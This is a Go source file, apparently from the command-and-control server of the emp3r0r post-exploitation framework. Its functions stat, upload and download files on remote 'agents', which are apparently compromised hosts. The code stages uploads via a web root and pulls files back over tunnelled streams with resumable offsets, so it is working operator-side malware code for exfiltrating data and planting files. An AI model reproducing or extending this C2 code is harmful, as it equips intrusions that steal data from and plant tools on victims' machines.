package cc

import (
	"encoding/json"
	"fmt"
	"os"
	"time"

	"github.com/google/uuid"
	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// StatFile Get stat info of a file on agent
func StatFile(filepath string, a *emp3r0r_data.SystemInfo) (fi *util.FileStat, err error) {
	cmd := fmt.Sprintf("!stat %s %s", filepath, uuid.NewString())
	err = SendCmd(cmd, a)
	if err != nil {
		return
	}
	var fileinfo util.FileStat

	defer func() {
		CmdResultsMutex.Lock()
		delete(CmdResults, cmd)
		CmdResultsMutex.Unlock()
	}()

	for {
		time.Sleep(100 * time.Millisecond)
		res, exists := CmdResults[cmd]
		if exists {
			err = json.Unmarshal([]byte(res), &fileinfo)
			if err != nil {
				return
			}
			fi = &fileinfo
			break
		}
	}

	return
}

// PutFile put file to agent
func PutFile(lpath, rpath string, a *emp3r0r_data.SystemInfo) error {
	// file sha256sum
	CliPrintInfo("Calculating sha256sum of %s", lpath)
	sum := tun.SHA256SumFile(lpath)
	// file size
	size := util.FileSize(lpath)
	sizemB := float32(size) / 1024 / 1024
	CliMsg("\nPutFile:\nUploading '%s' to\n'%s' "+
		"on %s, agent [%d]\n"+
		"size: %d bytes (%.2fMB)\n"+
		"sha256sum: %s",
		lpath, rpath,
		a.IP, Targets[a].Index,
		size, sizemB,
		sum,
	)

	// move file to wwwroot, then move it back when we are done with it
	CliPrintInfo("Copy %s to %s", lpath, WWWRoot+util.FileBaseName(lpath))
	err := util.Copy(lpath, WWWRoot+util.FileBaseName(lpath))
	if err != nil {
		return fmt.Errorf("Copy %s to %s: %v", lpath, WWWRoot+util.FileBaseName(lpath), err)
	}

	// send cmd
	cmd := fmt.Sprintf("put %s %s %d", lpath, rpath, size)
	err = SendCmd(cmd, a)
	if err != nil {
		return fmt.Errorf("PutFile send command: %v", err)
	}
	CliPrintInfo("Waiting for response from agent %s", a.Tag)
	return nil
}

// GetFile get file from agent
func GetFile(filepath string, a *emp3r0r_data.SystemInfo) error {
	if !util.IsFileExist(FileGetDir) {
		err := os.MkdirAll(FileGetDir, 0700)
		if err != nil {
			return fmt.Errorf("GetFile mkdir %s: %v", FileGetDir, err)
		}
	}
	CliPrintInfo("Waiting for response from agent %s", a.Tag)
	var data emp3r0r_data.MsgTunData
	filename := FileGetDir + util.FileBaseName(filepath) // will copy the downloaded file here when we are done
	tempname := filename + ".downloading"                // will be writing to this file
	lock := filename + ".lock"                           // don't try to duplicate the task

	// is this file already being downloaded?
	if util.IsFileExist(lock) {
		return fmt.Errorf("%s is already being downloaded", filename)
	}

	// stat target file, know its size, and allocate the file on disk
	fi, err := StatFile(filepath, a)
	if err != nil {
		return fmt.Errorf("GetFile: failed to stat %s: %v", filepath, err)
	}
	fileinfo := *fi
	filesize := fileinfo.Size
	err = util.FileAllocate(filename, filesize)
	if err != nil {
		return fmt.Errorf("GetFile: %s allocate file: %v", filepath, err)
	}
	CliMsg("We will be downloading %s, %d bytes in total (%s)", filepath, filesize, fileinfo.Checksum)

	// what if we have downloaded part of the file
	var offset int64 = 0
	if util.IsFileExist(tempname) {
		fiHave := util.FileSize(tempname)
		offset = fiHave
	}

	// mark this file transfer stream
	ftpSh := &StreamHandler{}
	// tell agent where to seek the left bytes
	ftpSh.Token = uuid.NewString()
	ftpSh.Buf = make(chan []byte)
	ftpSh.BufSize = 1024 * 8
	FTPMutex.Lock()
	FTPStreams[filepath] = ftpSh
	FTPMutex.Unlock()

	// h2x
	ftpSh.H2x = new(emp3r0r_data.H2Conn)

	// cmd
	cmd := fmt.Sprintf("#get %s %d %s", filepath, offset, ftpSh.Token)
	data.Payload = fmt.Sprintf("cmd%s%s", emp3r0r_data.OpSep, cmd)
	data.Tag = a.Tag
	err = Send2Agent(&data, a)
	if err != nil {
		CliPrintError("GetFile send command: %v", err)
		return err
	}

	return err
}
